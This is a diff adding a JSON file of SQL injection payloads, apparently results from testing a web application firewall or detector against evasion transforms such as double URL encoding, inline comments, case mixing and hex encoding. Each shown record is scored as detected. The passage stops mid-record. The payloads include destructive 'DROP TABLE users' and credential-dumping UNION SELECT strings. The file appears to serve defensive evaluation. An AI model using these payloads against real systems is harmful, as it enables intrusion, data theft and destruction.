@@ -1,0 +1,3187 @@
+[
+{
+"base": "1' OR '1'='1",
+"transformed": "1' OR '1'='1",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1%27%20OR%20%271%27%3D%271",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1%2527%2520OR%2520%25271%2527%253D%25271",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1' oR '1'='1",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1'/**/OR/**/'1'='1",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1'#OR#'1'='1",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1'/*x*/OR/*x*/'1'='1",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1'+OR+'1'='1",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1'\tOR\t'1'='1",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "1' OR '1'='1%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1",
+"transformed": "0x3127204f52202731273d2731",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1' OR '1'='1'--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1%27%20OR%20%271%27%3D%271%27--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1%2527%2520OR%2520%25271%2527%253D%25271%2527--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1' oR '1'='1'--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1'/**/OR/**/'1'='1'--",
+"transform": "comment_inline_mysql",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1'#OR#'1'='1'--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1'/*x*/OR/*x*/'1'='1'--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1'+OR+'1'='1'--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1'\tOR\t'1'='1'--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "1' OR '1'='1'--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'--",
+"transformed": "0x3127204f52202731273d2731272d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1' OR '1'='1'#",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1%27%20OR%20%271%27%3D%271%27%23",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1%2527%2520OR%2520%25271%2527%253D%25271%2527%2523",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1' oR '1'='1'#",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1'/**/OR/**/'1'='1'#",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1'#OR#'1'='1'#",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1'/*x*/OR/*x*/'1'='1'#",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1'+OR+'1'='1'#",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1'\tOR\t'1'='1'#",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "1' OR '1'='1'#%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR '1'='1'#",
+"transformed": "0x3127204f52202731273d27312723",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\" OR \"1\"=\"1",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1%22%20OR%20%221%22%3D%221",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1%2522%2520OR%2520%25221%2522%253D%25221",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\" oR \"1\"=\"1",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\"/**/OR/**/\"1\"=\"1",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\"#OR#\"1\"=\"1",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\"/*x*/OR/*x*/\"1\"=\"1",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\"+OR+\"1\"=\"1",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\"\tOR\t\"1\"=\"1",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "1\" OR \"1\"=\"1%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1\" OR \"1\"=\"1",
+"transformed": "0x3122204f52202231223d2231",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1 OR 1=1",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1%20OR%201%3D1",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1%2520OR%25201%253D1",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1 Or 1=1",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1/**/OR/**/1=1",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1#OR#1=1",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1/*x*/OR/*x*/1=1",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1+OR+1=1",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1\tOR\t1=1",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "1 OR 1=1%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 OR 1=1",
+"transformed": "0x31204f5220313d31",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1' OR 1=1--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1%27%20OR%201%3D1--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1%2527%2520OR%25201%253D1--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1' oR 1=1--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1'/**/OR/**/1=1--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1'#OR#1=1--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1'/*x*/OR/*x*/1=1--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1'+OR+1=1--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1'\tOR\t1=1--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "1' OR 1=1--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR 1=1--",
+"transformed": "0x3127204f5220313d312d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "' OR ''='",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "%27%20OR%20%27%27%3D%27",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "%2527%2520OR%2520%2527%2527%253D%2527",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "' Or ''='",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "'/**/OR/**/''='",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "'#OR#''='",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "'/*x*/OR/*x*/''='",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "'+OR+''='",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "'\tOR\t''='",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "' OR ''='%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR ''='",
+"transformed": "0x27204f522027273d27",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "admin'--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "admin%27--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "admin%2527--",
+"transform": "double_url_encode",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "AdMiN'--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "admin'--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'--",
+"transformed": "0x61646d696e272d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "admin'#",
+"transform": "identity",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "admin%27%23",
+"transform": "url_encode",
+"waf_score": 0.96,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "admin%2527%2523",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "AdMiN'#",
+"transform": "case_mix",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "admin'#%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "admin'#",
+"transformed": "0x61646d696e2723",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "' OR 1=1--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "%27%20OR%201%3D1--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "%2527%2520OR%25201%253D1--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "' Or 1=1--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "'/**/OR/**/1=1--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "'#OR#1=1--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "'/*x*/OR/*x*/1=1--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "'+OR+1=1--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "'\tOR\t1=1--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "' OR 1=1--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "' OR 1=1--",
+"transformed": "0x27204f5220313d312d2d",
+"transform": "hex_encode",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\" OR \"\"=\"",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "%22%20OR%20%22%22%3D%22",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "%2522%2520OR%2520%2522%2522%253D%2522",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\" Or \"\"=\"",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\"/**/OR/**/\"\"=\"",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\"#OR#\"\"=\"",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\"/*x*/OR/*x*/\"\"=\"",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\"+OR+\"\"=\"",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\"\tOR\t\"\"=\"",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "\" OR \"\"=\"%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "\" OR \"\"=\"",
+"transformed": "0x22204f522022223d22",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1; DROP TABLE users--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1%3B%20DROP%20TABLE%20users--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1%253B%2520DROP%2520TABLE%2520users--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1; dRoP TaBlE UsErS--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1;/**/DROP/**/TABLE/**/users--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1;#DROP#TABLE#users--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1;/*x*/DROP/*x*/TABLE/*x*/users--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1;+DROP+TABLE+users--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1;\tDROP\tTABLE\tusers--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "1; DROP TABLE users--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1; DROP TABLE users--",
+"transformed": "0x313b2044524f50205441424c452075736572732d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1' UNION SELECT NULL--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1%27%20UNION%20SELECT%20NULL--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1%2527%2520UNION%2520SELECT%2520NULL--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1' uNiOn sElEcT NuLl--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1'/**/UNION/**/SELECT/**/NULL--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1'#UNION#SELECT#NULL--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1'/*x*/UNION/*x*/SELECT/*x*/NULL--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1'+UNION+SELECT+NULL--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1'\tUNION\tSELECT\tNULL--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "1' UNION SELECT NULL--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL--",
+"transformed": "0x312720554e494f4e2053454c454354204e554c4c",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1' UNION SELECT NULL,NULL--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1%27%20UNION%20SELECT%20NULL%2CNULL--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1%2527%2520UNION%2520SELECT%2520NULL%252CNULL--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1' uNiOn sElEcT NuLl,nUlL--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1'/**/UNION/**/SELECT/**/NULL,NULL--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1'#UNION#SELECT#NULL,NULL--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1'/*x*/UNION/*x*/SELECT/*x*/NULL,NULL--",
+"transform": "comment_slash_star",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1'+UNION+SELECT+NULL,NULL--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1'\tUNION\tSELECT\tNULL,NULL--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL--",
+"transformed": "1' UNION SELECT NULL,NULL--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1' UNION SELECT NULL,NULL,NULL--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1' uNiOn sElEcT NuLl,nUlL,NuLl--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1'#UNION#SELECT#NULL,NULL,NULL--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1'/*x*/UNION/*x*/SELECT/*x*/NULL,NULL,NULL--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1'+UNION+SELECT+NULL,NULL,NULL--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1'\tUNION\tSELECT\tNULL,NULL,NULL--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' UNION SELECT NULL,NULL,NULL--",
+"transformed": "1' UNION SELECT NULL,NULL,NULL--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1 UNION SELECT * FROM users",
+"transform": "identity",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1%20UNION%20SELECT%20%2A%20FROM%20users",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1%2520UNION%2520SELECT%2520%252A%2520FROM%2520users",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1 UnIoN SeLeCt * fRoM UsErS",
+"transform": "case_mix",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1/**/UNION/**/SELECT/**/*/**/FROM/**/users",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1#UNION#SELECT#*#FROM#users",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1/*x*/UNION/*x*/SELECT/*x*/*/*x*/FROM/*x*/users",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1+UNION+SELECT+*+FROM+users",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1\tUNION\tSELECT\t*\tFROM\tusers",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "1 UNION SELECT * FROM users%00",
+"transform": "null_byte_suffix",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT * FROM users",
+"transformed": "0x3120554e494f4e2053454c454354202a2046524f",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1 UNION SELECT username,password FROM users",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1 UNION SELECT username,passwORd FROM users",
+"transform": "case_upper_keywords",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1#UNION#SELECT#username,password#FROM#users",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1/*x*/UNION/*x*/SELECT/*x*/username,password/*x*/FROM/*x*/users",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1+UNION+SELECT+username,password+FROM+users",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1\tUNION\tSELECT\tusername,password\tFROM\tusers",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "1 UNION SELECT username,password FROM users%00",
